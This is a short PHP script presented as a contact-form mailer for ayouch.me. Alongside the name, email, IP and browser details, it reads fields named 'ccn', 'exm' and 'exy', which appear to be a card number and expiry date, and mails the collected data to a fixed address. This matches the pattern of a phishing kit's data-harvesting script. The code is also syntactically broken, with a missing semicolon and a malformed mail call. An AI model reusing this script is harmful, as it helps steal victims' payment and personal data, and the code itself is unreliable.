<?php
$ip = getenv("REMOTE_ADDR");
$message .= "New email from the form\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "First Name: ".$_POST['first']."\n";
$message .= "Last name: ".$_POST['last']."\n";
$message .= "Message: ".$_POST['message']."\n";
$message .= "IP: $ip\n";
$message .= "BROWSER: ".$_SERVER['HTTP_USER_AGENT']."\n";
$cc = $_POST['ccn'];
$subject = "New email from ayouch.me form ".$_POST['exm']."/".$_POST['exy'];
$send = "yassine@ayouch.com"
$headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
mail($send,$subject,$message,$headers);

header("Location:http://ayouch.me/");?>